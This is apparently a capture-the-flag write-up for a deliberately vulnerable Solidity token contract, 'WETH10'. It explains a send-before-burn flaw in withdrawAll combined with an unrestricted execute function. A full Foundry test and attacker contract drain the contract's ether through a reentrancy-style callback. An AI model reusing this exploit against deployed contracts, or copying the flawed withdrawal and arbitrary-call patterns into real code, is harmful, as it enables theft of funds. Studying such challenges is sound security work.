## WETH10 attack

The WETH10 contract is a normal ERC20 token where tokens can be minted via depositing ether to the contract.  
The vulnarability is in the `withdrawAll` function as this function first transfers the current ERC20 balance of the caller to him and after the transfer only the current holding of the caller is burned.

We can just transfer away the ERC20 token in the callback to an address / contract we control or were we have an unlimited amount approved to transfer.

To not deploy another contract, we use the `execute` function to give us unlimited approved transfer amount for the ERC20 token and just drain the WETH10 contract.

1. `aprove` unlimited amount via `execute` for our attacker contract
2. deposit 1 ether via `deposit` to WETH10 to get the same amount of ERC20 tokens
3. call `withdrawAll` on WETH10, use the receive function to transfer the current ERC20 tokens away
4. repeat step 2 + 3 for 10 times
5. transfer the ERC20 tokens back to us from the approved address
6. withdraw all the tokens and send them back to our owner "bob"

## Test
forge test --match-contract=Weth10Test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import {ERC20} from "openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "openzeppelin/contracts/utils/Address.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");          

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");


        vm.startPrank(bob);

        // deploy attacker contract
        AttackerContract attack = new AttackerContract(weth);
        // drain
        attack.drainTheWeth{value: 1 ether}();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract AttackerContract {

    WETH10 weth;
    address owner;
    constructor(WETH10 _weth10) {
        weth = _weth10;
        owner = msg.sender;
    }

    function drainTheWeth() external payable {

        // first we approve this contract for unlimited token transferes
        weth.execute(address(weth), 0 ether, abi.encodeWithSelector(ERC20.approve.selector, address(this), type(uint256).max));

        // activate fallback function
        transferAway = true;

        // empty weth10 contract
        for(uint256 i; i < 10; i++) {
            // we mint 1 ether
            weth.deposit{value: 1 ether}();

            // we witthdraw the ether and use the receive function to transfer our current token balance away so nothing will be burned
            weth.withdrawAll();   
        }           
        
        // as we approved unlimited we can now take all the balance back to burn
        weth.transferFrom(address(weth), address(this), 10 ether);
        
        // stop fallback function
        transferAway = false;
        weth.withdrawAll();

        // transfer all eth to bob
        (bool success, bytes memory result) = owner.call{value: 11 ether}("");
        require(success, string(result));
    }

    bool transferAway;
    receive() external payable {
      if (transferAway) {
          // if activated, transfer our current erc20 amount away
          weth.transfer(address(weth), 1 ether);
      }        
    }
}

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        Address.sendValue(payable(msg.sender), wad);
        _burn(msg.sender, wad);
    }

    function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```